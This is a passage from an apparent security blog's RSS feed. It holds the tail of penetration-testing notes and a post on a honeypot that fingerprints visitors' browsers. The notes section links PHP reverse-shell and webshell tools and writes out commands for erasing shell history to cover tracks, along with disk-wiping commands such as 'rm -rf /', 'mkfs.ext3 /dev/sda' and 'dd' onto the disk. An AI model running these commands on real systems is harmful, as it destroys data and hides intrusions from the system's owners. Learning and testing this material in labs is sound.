&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;php-reverse-shell&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.whitewinterwolf.com/posts/2017/12/02/wwwolfs-php-webshell-users-guide/&quot;&gt;whitewinterwolf php webshell&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;covering-the-tracks&quot;&gt;Covering the tracks&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Avoiding history&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Clear history&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
touch .bash_history (invasive)
history -c
set +o history
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Destroy&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
find / -type f -exec {} 
mkfs.ext3 /dev/sda
dd if=/dev/zero of=/dev/sda bs=1M
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells&quot;&gt;escaping-restricted-linux-shells&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.kernel-exploits.com/&quot;&gt;kernel-exploits&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/andrew-d/static-binaries&quot;&gt;static-binaries&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;Basic Linux Privilege Escalation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-penetration-testing-commands&quot;&gt;Linux Penetration Testing Commands&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 17 Mar 2018 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/VHL-notes.html</link>
        <guid isPermaLink="true">https://1modm.github.io/VHL-notes.html</guid>
        
        
      </item>
    
      <item>
        <title>Device fingerprint</title>
        <description>&lt;h2 id=&quot;fingerprint&quot;&gt;Fingerprint&lt;/h2&gt;

&lt;p&gt;A device fingerprint or machine fingerprint or browser fingerprint is information collected about a remote computing device for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off. With the assistance of client-side scripting languages, collection of much more esoteric parameters is possible. Recently such fingerprints have proven useful in the detection and prevention of online identity theft and credit card fraud.&lt;/p&gt;

&lt;p&gt;Using Django, some python libraries and &lt;a href=&quot;https://github.com/Valve/fingerprintjs2&quot;&gt;Fingerprintjs2&lt;/a&gt;, I added this way to obtain this information into the website used for Penetration/Exploit/Hijacking honeypot deployed &lt;a href=&quot;/Dshell_Penetration-Exploit-Hijacking_decoders.html&quot;&gt;Penetration/Exploit/Hijacking decoders for Dshell&lt;/a&gt;, so when someone is browsing into a bespoke ‘hello’ website, it could be possible to obtain all this information:&lt;/p&gt;

&lt;h3 id=&quot;http-headers-identified&quot;&gt;HTTP Headers identified&lt;/h3&gt;

&lt;p&gt;Using python libraries.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP_HOST
HTTP_USER_AGENT
HTTP_ACCEPT
HTTP_ACCEPT_LANGUAGE
HTTP_ACCEPT_ENCODING
HTTP_CONNECTION
HTTP_UPGRADE_INSECURE_REQUESTS
REMOTE_ADDR
REMOTE_PORT
REQUEST_METHOD
REQUEST_URI
REQUEST_TIME
SERVER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;geolocation-information-identified&quot;&gt;Geolocation information identified&lt;/h3&gt;

&lt;p&gt;Using services provided by &lt;a href=&quot;http://freegeoip.net/json/&quot;&gt;freegeoip&lt;/a&gt; or &lt;a href=&quot;https://www.maxmind.com/es/home&quot;&gt;maxmind&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;location_city
location_state
location_country
latitude
longitude
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;browser-fingerprint-identified&quot;&gt;Browser fingerprint identified&lt;/h3&gt;

&lt;p&gt;Using &lt;a href=&quot;https://github.com/Valve/fingerprintjs2&quot;&gt;Fingerprintjs2&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fingerprint
user_agent
language
color_depth
device_memory
pixel_ratio
hardware_concurrency
resolution
available_resolution
timezone_offset
session_storage
local_storage
indexed_db
cpu_class
navigator_platform
do_not_track
regular_plugins
canvas
webgl
webgl_vendor
adblock
has_lied_languages
has_lied_resolution
has_lied_os
has_lied_browser
touch_support
js_fonts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;example&quot;&gt;Example&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;public/images/HDwXbQw.png&quot; alt=&quot;HDwXbQw&quot; title=&quot;HDwXbQw&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;other-services&quot;&gt;Other services&lt;/h3&gt;

&lt;p&gt;Similar services are provided by thirdparty websites like:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://iplogger.org/&quot;&gt;iplogger&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://grabify.link/&quot;&gt;grabify&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://blasze.tk/&quot;&gt;blasze&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.ip-adress.com&quot;&gt;ip-adress&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://panopticlick.eff.org&quot;&gt;panopticlick&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 09 Dec 2017 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/Browser-fingerprint.html</link>
        <guid isPermaLink="true">https://1modm.github.io/Browser-fingerprint.html</guid>
        
        
      </item>
    
  </channel>
</rss>
